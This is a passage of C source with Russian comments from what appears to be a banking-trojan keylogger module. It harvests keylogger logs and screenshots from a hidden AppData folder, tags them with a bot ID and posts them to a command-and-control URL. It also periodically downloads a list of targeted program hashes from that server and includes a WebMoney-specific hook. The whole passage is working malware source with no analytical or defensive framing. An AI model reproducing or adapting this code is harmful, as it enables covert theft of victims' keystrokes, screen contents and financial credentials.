						PCHAR fFileName=STR::New((PCHAR)lpData1,ttt);
						KLDBG("имя файла есть");

						//хеш вызваной проги
						lpData1=lpData+2;			
						lpData=m_strstr((char*)lpData1,"\r\n");					
						ttt=(lpData-(char*)lpData1);
						PCHAR Hach=STR::New((PCHAR)lpData1,ttt);
						KLDBG("хеш вызваной проги");
						
						//хеш запуска
						lpData1=lpData+2;			
						lpData=m_strstr((char*)lpData1,"\r\n");					
						ttt=(lpData-(char*)lpData1);
						PCHAR sHach=STR::New((PCHAR)lpData1,ttt);
						KLDBG("хеш запуска");
						
						//хеш из мд5 файла скрина
						lpData1=lpData+2;			
						lpData=m_strstr((char*)lpData1,"\r\n");					
						ttt=(lpData-(char*)lpData1);
						PCHAR pScreen_md5=STR::New((PCHAR)lpData1,ttt);
						lpData=lpData+2;	
						KLDBG("хеш из мд5 файла скрина");

						DWORD iCount=lpData-(char*)Data;
						//кодируем данные для отправки
						KLDBG("закодируем для отправки");
						PCHAR SData	= BASE64::Encode((LPBYTE)lpData,dwWriteB-iCount);
						if (SData!=NULL)
						{
							PCHAR BotID =GenerateBotID();
												
							
							PMultiPartData Data = MultiPartData::Create();

							MultiPartData::AddStringField(Data, "id"		, BotID);
							MultiPartData::AddStringField(Data, "type"		, "2");
							MultiPartData::AddStringField(Data, "hash"		, Hach);
							MultiPartData::AddStringField(Data, "shash"		, sHach);
							MultiPartData::AddStringField(Data, "screen_md5", pScreen_md5);
							MultiPartData::AddStringField(Data, "log"		, SData);
							MultiPartData::AddFileField	 (Data, "screen"	, fFileName, NULL);
							KLDBG(SData);


							PCHAR URL = GetBotScriptURL(SCRIPT_KEYLOGGER);

							PCHAR Buf = NULL;
							HTTP::Post(URL, Data, &Buf, NULL);
							
							STR::Free(URL);
							STR::Free(Buf);
							MultiPartData::Free(Data);
							KLDBG("отправили, чистим память и переходим к следующим парам файл+ скрин");

							#ifdef ___WEB_MONEY_DLLL____
								KLDBG("Создаем ивент для включения отправки баланса вебмани");
								if (! plstrcmpA(Hach,"0xF8083E3B"))
								{
									KLDBG("IsItWebMoney");
									// for Webmoney 
									HANDLE hEvent = (HANDLE) CreateEventA(NULL,TRUE,FALSE,WEBMONEY_EVENT);
									if (!hEvent)
										KLDBG("create Event Failed");					
										pSleep(2000);
									pCloseHandle(hEvent);
								};

							#endif
						}
						STR::Free(Hach);
						STR::Free(SData);

						dwGlobSiz=dwWriteB;
						/*if (Data!=NULL)
							pDeleteFileW(FileName);// Удаляем файл
						*/MemFree(Data);

					}
				}
			}
		}
		// Получаем следцющий файл
		if (!pFindNextFileW(File, &Search)) break;
	}

	// Освобождаем данные

	pFindClose(File);

	return NULL;
}


bool DownloadHashList(PCHAR URL,PCHAR *HTMLCode)
{
	// Загрузить команду, тобишь список хешей которые преследуем
	if (URL == NULL)
		return false;
	PCHAR BotID =GenerateBotID();

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "id", BotID);
	AddURLParam(Fields, "type", "1");
    STR::Free(BotID);
	bool Result = HTTP::Post(URL, Fields, HTMLCode, NULL);

	Strings::Free(Fields);
    return Result;
}

DWORD WINAPI SendLoadedThred( LPVOID lpData )
{
	KLDBG("поток для создании папки для скрина и отслеживания появления в ней данных");
	//поток для создании папки для скрина и отслеживания появления в ней данных
	PCHAR URL = GetBotScriptURL(SCRIPT_KEYLOGGER);
	
	KLDBG("____________________________________________________________________");
	KLDBG(URL);
//***********************



	PCHAR Command = NULL;
	while(true)	
	{

		//создаем папку KYL для данных кейлогера(dat,jpg) и файла с хешами
		WCHAR SysPath_[MAX_PATH];
		pSHGetFolderPathW(NULL, 0x001a, NULL, 0, SysPath_);
		plstrcatW( SysPath_, L"\\KYL\\" );
	
		while((BOOL)pCreateDirectoryW(SysPath_,NULL))
		{pSleep(1);}
		if (DownloadHashList(URL, &Command))

		{
			//парсим список хешей и записываем их в файл 
			KLDBG(Command);
			if (m_strstr(Command,"<HEAD>"))continue;
			if (m_strstr(Command,"\r\n"))
			{
				PCHAR Data= STR::GetRightStr(Command,"\r\n");
				PCHAR DataToWr= STR::GetLeftStr(Data,"\r\n");
				FileCreateInFolder(0x001a,L"KYL\\fi.dat",DataToWr,m_lstrlen(DataToWr));
				STR::Free(Data);
				STR::Free(DataToWr);
			}
			else
			{
				int i=0;
				while (!FileCreateInFolder(0x001a,L"KYL\\fi.dat",Command,m_lstrlen(Command)))
				{
					if (i>50) break;
					i++;
					pSleep(1);
				}	
			}
			STR::Free(Command);
		
			pSleep(15*1000*60);
			
			SendKeyLogerData(0x001a,L"KYL", L"*.dats");//ищит файлы *.dats в заданной директории

		}

	}

   /*	while (true)
	{
		pSleep(1*1000*60);
		LPBYTE lDat = SendKeyLogerData(0x001a,L"KYL", L"*.dats");

		pSleep(5*1000*60);
		SendKeyLogerData(0x001a,L"KYL", L"*.dats");

	}*/
	STR::Free(URL);

	return 0;
}

void SendLoadedFiles()
{	
	KLDBG("start thraed for keyloging SendLoadedThred");
	StartThread(SendLoadedThred,NULL);
}

DWORD WINAPI SetScreensThread( LPVOID lpData )
{
	//получаем путь к файлу WCHAR а потом делаем скрин из мд5 файла делаем хеш и возвращаем его
	KLDBG("делаем скрин и сохраняем его в файл");
	LPVOID lpScrFile;
	DWORD dwScrSize;
	DWORD Result=0;
	
	GetScreen( &lpScrFile, &dwScrSize );
	bool bAddScreen  = false;
	WCHAR *ScreenFile = (WCHAR*)lpData;//GetTempNameA();

	if ( lpScrFile && ScreenFile )
	{										
		HANDLE hScreen = (HANDLE)pCreateFileW( ScreenFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

		if ( hScreen != INVALID_HANDLE_VALUE )
		{
			DWORD dwWritten = 0;

			if ( (BOOL)pWriteFile( hScreen, lpScrFile, dwScrSize, &dwWritten, 0 ) )
			{
				bAddScreen = true;
			}

		} 
		Result= GetByteFileHash((LPBYTE)lpScrFile,dwScrSize);

		pCloseHandle( hScreen );
		MemFree(lpScrFile);		
	}
	KLDBG("скрин должен быть уже сделан");
	return Result;

}

